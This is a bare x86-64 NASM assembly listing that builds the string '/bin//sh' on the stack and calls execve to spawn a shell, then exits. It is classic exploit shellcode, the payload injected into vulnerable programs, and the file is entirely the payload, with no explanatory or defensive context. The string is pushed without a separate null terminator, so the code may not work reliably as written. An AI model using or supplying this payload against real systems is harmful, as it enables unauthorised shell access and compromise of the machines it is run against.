BITS 64
GLOBAL _start
_start:
    xor     eax, eax
    mov     rbx, 0x68732f2f6e69622f
    push    rbx
    mov     rdi, rsp
    xor     esi, esi
    xor     edx, edx
    mov     al, 59
    syscall
    xor     edi, edi
    mov     al, 60
    syscall
